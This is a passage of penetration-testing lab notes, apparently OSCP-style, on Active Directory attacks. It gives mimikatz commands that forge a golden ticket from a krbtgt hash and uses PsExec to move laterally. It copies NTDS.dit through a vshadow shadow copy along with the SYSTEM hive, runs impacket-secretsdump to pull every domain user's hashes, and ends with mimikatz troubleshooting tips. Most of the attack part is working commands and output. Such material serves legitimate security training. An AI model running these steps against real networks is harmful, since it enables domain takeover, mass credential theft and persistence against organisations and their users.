2. Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain. We'll take the hash and continue the procedure from a compromised workstation.
    ```cmd
    mimikatz # kerberos::purge
    Ticket(s) purge for current session is OK

    mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
    ```
3. With the golden ticket injected into memory, we can launch a new command prompt with **misc::cmd** and attempt lateral movement with PsExec.
    ```cmd
    mimikatz # misc::cmd
    Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
    ...
    C:\Users\offsec.corp> psexec.exe \\dc01 cmd.exe
    ```

**Note**: by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked
```cmd
C:\Users\Offsec.corp> psexec.exe \\192.168.1.110 cmd.exe

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Couldn't access 192.168.1.110:
Access is denied.
```
### Shadow Copies
A [*Shadow Copy*](https://en.wikipedia.org/wiki/Shadow_Copy), also known as Volume Shadow Service (VSS) is a Microsoft backup technology that allows creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary [*vshadow.exe*](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

As domain admins, we have the ability to abuse the vshadow utility to create a Shadow Copy that will allow us to extract the [Active Directory Database **NTDS.dit** database file](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961761(v=technet.10)?redirectedfrom=MSDN). Once we've obtained a copy of said database, we can extract every user credential offline on our local Kali machine.

To start off, we'll connect as the domain admin user to the domain controller and launch from an elevated prompt the [**vshadow** utility with **-nw** options to disable writers](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details), which speeds up backup creation and include the **-p** option to store the copy on disk.
```cmd
C:\Tools>vshadow.exe -nw -p  C:
...
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
...
```
Copy the whole (ntds) AD Database from the shadow copy to the **C:** drive root folder by specifying the shadow copy device name and append the full **ntds.dit** path.
```cmd
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
   1 file(s) copied.
```
As a last ingredient, to correctly extract the content of **ntds.dit**, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the **reg** utility and the **save** argument.
```
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```

Once the two **.bak** files are moved to our Kali machine, we can continue extracting the credential materials with the secretsdump tool from the impacket suite. We'll supply the ntds database and the system hive via **-ntds** and **-system**, respectively along with the **LOCAL** keyword to parse the files locally.
```sh
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

...
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
...
```

We managed to obtain NTLM hashes and Kerberos keys for every AD user, which can now be further cracked or used as-is through pass-the-hash attacks.

While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.

To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module, which can be misused as a less conspicuous persistence technique.

### Dump Hashes in Windows XP
0. Create a r4n$0m user using [this script](https://gist.github.com/A-Pisani/efa2a11cbf555e7e83c70c9406b730c6#file-win_useradd-bat).
1. From Kali:
    ```sh
    kali@kali:~$ impacket-secretsdump r4n$0m:password@$IP -outputfile hashes
    ```
## Mimikatz Troubleshooting
1. You are not running it as local Administrator. 
    ```cmd
    mimikatz # privilege::debug
    ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
    ```
2. You need to install an older version of [mimikatz 2.1.1 for Win 10 1809-1803](https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip) previous to 2.2.0
    ```cmd
    mimikatz # sekurlsa::logonpasswords
    ERROR kuhl_m_sekurlsa_acquireLSA ; Key import

    mimikatz # sekurlsa::logonpasswords
    ERROR kuhl_m_sekurlsa_acquireLSA ; Key import
    ```
3. You need to either use psexec to begin SYSTEM (or other tools) or elevate with `token::elevate` command to impersonate a SYSTEM token. Ref: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#online
    ```cmd
    mimikatz # lsadump::sam
    Domain : XOR-APP23
    SysKey : 05ac7ba0058f6806f2efa8f36d8854bd
    ERROR kull_m_registry_OpenAndQueryWithAlloc ; kull_m_registry_RegOpenKeyEx KO
    ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)
    ```
